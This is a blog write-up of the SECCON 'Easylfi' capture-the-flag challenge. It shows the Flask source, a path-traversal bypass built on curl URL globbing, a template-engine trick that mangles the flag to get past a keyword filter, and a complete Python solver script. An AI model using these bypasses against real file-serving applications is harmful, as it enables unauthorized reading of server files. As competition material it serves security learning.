---
title: Easylfi
published: true
ayout: post
date: 2022-10-15 18:54 +0600
tags: [CTF]
featured: false
---

I solved some web challenges with my idol ginoah. The challenges are awesome!

Description:

Can you read my secret?

The goal is to LFI /flag.txt

This flask app use curl to get a local file

This is server-side challenge.

You access the server:

![](https://raw.githubusercontent.com/Spy0x7/Spy0x7.github.io/master/assets/2022-10-15-Easylfi/2022-10-15-Easylfi-01.png)


If you submit `test`, the server redirects to `/hello.html?%7Bname%7D=test:`


![](https://raw.githubusercontent.com/Spy0x7/Spy0x7.github.io/master/assets/2022-10-15-Easylfi/2022-10-15-Easylfi-02.png)


Source code `(web/app.py` ):


```python
from flask import Flask, request, Response
import subprocess
import os

app = Flask(__name__)


def validate(key: str) -> bool:
    # E.g. key == "{name}" -> True
    #      key == "name"   -> False
    if len(key) == 0:
        return False
    is_valid = True
    for i, c in enumerate(key):
        if i == 0:
            is_valid &= c == "{"
        elif i == len(key) - 1:
            is_valid &= c == "}"
        else:
            is_valid &= c != "{" and c != "}"
    return is_valid


def template(text: str, params: dict[str, str]) -> str:
    # A very simple template engine
    for key, value in params.items():
        if not validate(key):
            return f"Invalid key: {key}"
        text = text.replace(key, value)
    return text


@app.after_request
def waf(response: Response):
    if b"SECCON" in b"".join(response.response):
        return Response("Try harder")
    return response


@app.route("/")
@app.route("/<path:filename>")
def index(filename: str = "index.html"):
    if ".." in filename or "%" in filename:
        return "Do not try path traversal :("

    try:
        proc = subprocess.run(
            ["curl", f"file://{os.getcwd()}/public/{filename}"],
            capture_output=True,
            timeout=1,
        )
    except subprocess.TimeoutExpired:
        return "Timeout"

    if proc.returncode != 0:
        return "Something wrong..."
    return template(proc.stdout.decode(), request.args)

```

The goal is stealing a flag from `/flag.txt`.

## Solution


### Step 1: path traversal

The server uses curl to read files:


```code
proc = subprocess.run(
    ["curl", f"file://{os.getcwd()}/public/{filename}"],
    capture_output=True,
    timeout=1,
)
```



Unfortunately, path traversal to `/flag.txt` is prevented:

```code
if ".." in filename or "%" in filename:
    return "Do not try path traversal :("
```

By the way, curl has a feature of  [URL globbing](https://everything.curl.dev/cmdline/globbing), and you can access multiple resources at the same time.
You can bypass the above defense using this feature:

```
$ http "http://localhost:3000/.{.}/.{.}/flag.txt"
HTTP/1.1 200 OK
Connection: close
Content-Length: 10
Content-Type: text/html; charset=utf-8
Date: Sat, 05 Nov 2022 12:09:18 GMT
Server: Werkzeug/2.2.2 Python/3.10.8

Try harder

```

However, the following WAF hides the flag response:

```
@app.after_request
def waf(response: Response):
    if b"SECCON" in b"".join(response.response):
        return Response("Try harder")
    return response

```

### Step 2: bypassing WAF

The server returns a response after the following process:


```return template(proc.stdout.decode(), request.args)```


The implementation of the template engine is as follows:


```code
def validate(key: str) -> bool:
    # E.g. key == "{name}" -> True
    #      key == "name"   -> False
    if len(key) == 0:
        return False
    is_valid = True
    for i, c in enumerate(key):
        if i == 0:
            is_valid &= c == "{"
        elif i == len(key) - 1:
            is_valid &= c == "}"
        else:
            is_valid &= c != "{" and c != "}"
    return is_valid


def template(text: str, params: dict[str, str]) -> str:
    # A very simple template engine
    for key, value in params.items():
        if not validate(key):
            return f"Invalid key: {key}"
        text = text.replace(key, value)
    return text

```

Is it possible to show the flag string without `SECCON` by abusing this template engine?

The first important point is that `validate("{")` is `True`. You can bypass it with this bug and URL globbing.

Example payload:

   - URL: ```file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}```
   - params:

   ```code
   {
    "{name}": "{",
    "{": "}{",
    "{!</h1>\n</body>\n</html>\n--_curl_--file:///app/public/../../flag.txt\nSECCON}": ""
}

```

The process in the template engine is as follows.

The initial state:

```
... snip ...
<body>
  <h1>Hello, {name}!</h1>
</body>
</html>
--_curl_--file:///app/public/../../flag.txt
SECCON{real_flag}

```

```"{name}" → "{":```

```
... snip ...
<body>
  <h1>Hello, {!</h1>
</body>
</html>
--_curl_--file:///app/public/../../flag.txt
SECCON{real_flag}

```

`"{" → "}{":`


```
... snip ...
<body>
  <h1>Hello, }{!</h1>
</body>
</html>
--_curl_--file:///app/public/../../flag.txt
SECCON}{real_flag}

```

```"{!</h1>\n</body>\n</html>\n--_curl_--file:///app/public/../../flag.txt\nSECCON}" → "":```


```
... snip ...
<body>
  <h1>Hello, }{real_flag}

```

### Solver

```python
import os
import httpx

BASE_URL = f"http://easylfi.seccon.games:3000"

res = httpx.get(
    BASE_URL + "/{.}./{.}./{app/public/hello.html,flag.txt}",
    params={
        "{name}": "{",
        "{": "}{",
        "{!</h1>\n</body>\n</html>\n--_curl_--file:///app/public/../../flag.txt\nSECCON}": "",
    },
)

print("SECCON" + res.text.split("<h1>Hello, }")[1])

```

## Credit to
* [cjiso1117](https://twitter.com/cjiso1117)

